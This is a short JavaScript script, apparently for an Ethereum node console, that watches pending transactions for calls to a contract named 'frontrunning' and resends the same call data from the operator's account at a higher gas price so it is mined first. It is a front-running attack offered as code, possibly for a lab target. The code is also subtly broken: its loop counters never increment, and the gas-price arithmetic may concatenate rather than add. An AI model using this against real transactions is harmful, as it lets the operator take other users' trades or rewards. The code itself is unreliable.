var loop_id;
var run_flag = 1;
loop_id = setInterval(loop,1000);

function loop(){   
	if (run_flag == 0) {
		clearInterval(loop_id);
		return 0;
	};
	console.log("run_flag:",run_flag);
    content = txpool.content;
    pending = content.pending;
    addr_keys = Object.keys(pending);
    for (var addr_key_i = 0;addr_key_i < addr_keys.length && run_flag == 1;addr_key_i + 1){
        
        addr_key = addr_keys[addr_key_i];
        
        //console.log(addr_key);
        pending_tx = pending[addr_key];
        
        tx_keys = Object.keys(pending_tx);
        
        for (var tx_key_i = 0;tx_key_i < tx_keys.length && run_flag == 1; tx_key_i + 1){
        
            tx_key = tx_keys[tx_key_i];
	        console.log(tx_key);
	        tx_data = pending_tx[tx_key];
	
	        if (run_flag == 1 && tx_data.to == frontrunning.address
	            && tx_data.from != web3.eth.accounts[1]
	            && tx_data.input.slice(0,10)=="0xc7e2b664"){
	            
	                console.log(tx_data.gasPrice + 10);
		            
	                web3.eth.sendTransaction({
	                    from: web3.eth.accounts[1],
	                    to: tx_data.to,
	                    data: tx_data.input,
	                    gasPrice: tx_data.gasPrice + 10
	                },function(err, address) {
	                	if (!err){
						    console.log("Send TX Result");
						    console.log(address);  
						    clearInterval(loop_id);
						} 
		            });
		            run_flag = 0;
	          }
	
        };
    };
 }
 

